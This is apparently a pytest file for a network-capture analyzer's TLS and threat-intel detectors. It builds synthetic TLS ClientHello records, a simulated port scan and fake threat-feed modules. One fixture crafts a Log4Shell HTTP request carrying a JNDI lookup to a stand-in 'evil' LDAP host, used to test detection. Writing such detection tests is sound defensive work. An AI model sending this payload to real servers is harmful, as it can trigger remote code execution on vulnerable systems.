"""The four post-detectors that resisted the earlier batches.

Two need a ClientHello crafted byte-for-byte (the SNI / ECH extensions the
detectors key on aren't reachable through scapy's TLS layer the way JA3 is, so
we synthesise the TLS record directly — see ``_client_hello``):

  * SuspiciousSniDetector       — IP-literal SNI, and ClientHello-without-SNI.
  * EncryptedClientHelloDetector — the encrypted_client_hello extension (0xfe0d).

Two are network/feed-backed and no-op offline; we drive them by injecting a
fake ``threat_intel`` module into ``sys.modules``, which the detectors' lazy
``from threat_intel import ...`` inside ``run()`` then resolves. This works even
where the real ``threat_intel`` can't import (it pulls in ``requests``), so the
suite exercises the alert-building logic while staying fully offline:

  * GreyNoiseRiotDetector — RIOT/benign enrichment of a port-scan source.
  * KevEnricherDetector    — CISA KEV cross-reference of a CVE-bearing alert.
"""

import struct
import sys
import types

from scapy.all import IP, TCP, Raw

from conftest import LOCAL_IP, EXTERNAL_IP, find_alerts, has_alert


def _fake_threat_intel(monkeypatch, **attrs):
    """Install a stub ``threat_intel`` module exposing only ``attrs``.

    The real module imports ``requests`` at top level, so it may not import in
    a bare environment; the detectors guard their ``from threat_intel import``
    with try/except for exactly this reason. Swapping sys.modules lets us drive
    the feed-backed paths deterministically without the network or requests.
    """
    mod = types.ModuleType("threat_intel")
    for name, value in attrs.items():
        setattr(mod, name, value)
    monkeypatch.setitem(sys.modules, "threat_intel", mod)
    return mod


# --------------------------------------------------------------------------
# Synthetic TLS ClientHello
# --------------------------------------------------------------------------

def _client_hello(sni=None, ech=False, version=0x0303):
    """Build a minimal but valid TLS ClientHello record (with 5-byte record
    header) that ``pcap_analyzer.tls.parse_client_hello`` accepts.

    ``sni``  -> emits a server_name extension (0x0000) carrying that host.
    ``ech``  -> emits an empty encrypted_client_hello extension (0xfe0d).
    """
    body = struct.pack("!H", version)      # client_version
    body += b"\x00" * 32                    # random
    body += b"\x00"                         # session_id length (0)
    ciphers = b"\x00\x2f"                   # one suite: TLS_RSA_WITH_AES_128_CBC_SHA
    body += struct.pack("!H", len(ciphers)) + ciphers
    body += b"\x01\x00"                     # compression_methods: 1 byte, null

    exts = b""
    if sni is not None:
        name = sni.encode()
        # server_name_list: name_type(0) + name_len(2) + name
        sni_list = b"\x00" + struct.pack("!H", len(name)) + name
        sni_ext_data = struct.pack("!H", len(sni_list)) + sni_list
        exts += struct.pack("!HH", 0x0000, len(sni_ext_data)) + sni_ext_data
    if ech:
        exts += struct.pack("!HH", 0xfe0d, 0)   # empty ECH extension
    body += struct.pack("!H", len(exts)) + exts

    hs = b"\x01" + struct.pack("!I", len(body))[1:] + body   # handshake header
    record = b"\x16\x03\x03" + struct.pack("!H", len(hs)) + hs
    return record


def _ch_packet(sni=None, ech=False, dst=EXTERNAL_IP):
    return (IP(src=LOCAL_IP, dst=dst)
            / TCP(sport=50000, dport=443, flags="PA")
            / Raw(_client_hello(sni=sni, ech=ech)))


# --------------------------------------------------------------------------
# SuspiciousSniDetector
# --------------------------------------------------------------------------

def test_ip_literal_sni_is_suspicious(analyze):
    results = analyze([_ch_packet(sni="45.33.32.156")])
    hits = find_alerts(results, title="Suspicious TLS SNI", category="tls")
    assert hits
    assert hits[0]["severity"] == "high"
    assert hits[0]["details"]["sni"] == "45.33.32.156"
    assert any("IP literal" in r for r in hits[0]["details"]["reasons"])


def test_client_hello_without_sni_to_external_is_medium(analyze):
    results = analyze([_ch_packet(sni=None)])
    hits = find_alerts(results, title="TLS ClientHello Without SNI", category="tls")
    assert hits
    assert hits[0]["severity"] == "medium"
    assert hits[0]["details"]["dst"] == EXTERNAL_IP


def test_benign_sni_does_not_fire(analyze):
    results = analyze([_ch_packet(sni="www.google.com")])
    assert not has_alert(results, title="Suspicious TLS SNI")
    assert not has_alert(results, title="TLS ClientHello Without SNI")


# --------------------------------------------------------------------------
# EncryptedClientHelloDetector
# --------------------------------------------------------------------------

def test_encrypted_client_hello_fires(analyze):
    # Benign outer SNI so the no-SNI path stays quiet; ECH ext drives this one.
    results = analyze([_ch_packet(sni="cloudflare-ech.com", ech=True)])
    hits = find_alerts(results, title="Encrypted Client Hello", category="tls")
    assert hits
    assert hits[0]["severity"] == "medium"
    assert hits[0]["details"]["dst"] == EXTERNAL_IP


def test_client_hello_without_ech_does_not_fire(analyze):
    results = analyze([_ch_packet(sni="cloudflare-ech.com", ech=False)])
    assert not has_alert(results, title="Encrypted Client Hello")


# --------------------------------------------------------------------------
# GreyNoiseRiotDetector  (monkeypatched feed)
# --------------------------------------------------------------------------

def _port_scan(src=EXTERNAL_IP, dst=LOCAL_IP):
    packets = []
    t = 1_000_000.0
    for port in range(20, 50):   # 30 ports -> crosses the default threshold
        pk = IP(src=src, dst=dst) / TCP(sport=44444, dport=port, flags="S")
        pk.time = t
        t += 0.01
        packets.append(pk)
    return packets


def test_greynoise_riot_classifies_scanner_benign(analyze, monkeypatch):
    def fake_greynoise(ip, settings=None):
        return {"noise": True, "riot": True, "classification": "benign",
                "name": "Censys", "message": "ok"}

    _fake_threat_intel(monkeypatch, check_greynoise=fake_greynoise)
    results = analyze(_port_scan(), settings={"api_keys": {"greynoise": "k"}})

    # The original port-scan alert still stands...
    assert has_alert(results, title="Port Scan", category="scan")
    # ...and the RIOT enrichment adds a benign counter-signal.
    hits = find_alerts(results, title="classified BENIGN by GreyNoise", category="scan")
    assert hits
    assert hits[0]["severity"] == "low"
    assert hits[0]["details"]["riot"] is True
    assert hits[0]["details"]["src"] == EXTERNAL_IP


def test_greynoise_no_op_without_api_key(analyze, monkeypatch):
    def boom(ip, settings=None):  # must never be reached without a key
        raise AssertionError("check_greynoise called without an API key")

    _fake_threat_intel(monkeypatch, check_greynoise=boom)
    results = analyze(_port_scan())  # no api_keys in settings
    assert not has_alert(results, title="classified BENIGN by GreyNoise")


# --------------------------------------------------------------------------
# KevEnricherDetector  (monkeypatched catalog)
# --------------------------------------------------------------------------

_KEV_CATALOG = {
    "CVE-2021-44228": {
        "cve": "CVE-2021-44228",
        "vendor": "Apache",
        "product": "Log4j2",
        "name": "Apache Log4j2 RCE (Log4Shell)",
        "date_added": "2021-12-10",
        "short_description": "JNDI lookup RCE.",
        "required_action": "Apply updates.",
        "due_date": "2021-12-24",
        "ransomware": True,
        "source": "CISA KEV",
    },
}


def _log4shell_request():
    payload = ("GET /a?x=${jndi:ldap://evil/a} HTTP/1.1\r\n"
               "Host: target.local\r\n\r\n").encode()
    return IP(src=EXTERNAL_IP, dst=LOCAL_IP) / TCP(sport=44444, dport=80, flags="PA") / Raw(payload)


def test_kev_enricher_cross_references_log4shell(analyze, monkeypatch):
    _fake_threat_intel(monkeypatch, load_cisa_kev=lambda: _KEV_CATALOG)

    results = analyze([_log4shell_request()])

    # A KEV summary alert is emitted for the matched CVE.
    kev = find_alerts(results, title="CISA KEV match", category="threat-intel")
    assert kev
    assert "CVE-2021-44228" in kev[0]["title"]
    # ransomware=True -> the summary is critical.
    assert kev[0]["severity"] == "critical"

    # The originating Exploit Payload alert is annotated in place with the KEV
    # cross-reference. (Log4Shell already starts critical, so the ransomware
    # severity-bump branch is a no-op here — severity_original stays unset.)
    exploit = find_alerts(results, title="Exploit Payload Detected", category="http")
    assert exploit
    matches = exploit[0]["details"].get("kev_matches")
    assert matches and matches[0]["cve"] == "CVE-2021-44228"
    assert matches[0]["ransomware"] is True
    assert exploit[0]["severity"] == "critical"


def test_kev_enricher_no_op_with_empty_catalog(analyze, monkeypatch):
    _fake_threat_intel(monkeypatch, load_cisa_kev=lambda: {})
    results = analyze([_log4shell_request()])
    assert not has_alert(results, title="CISA KEV match")
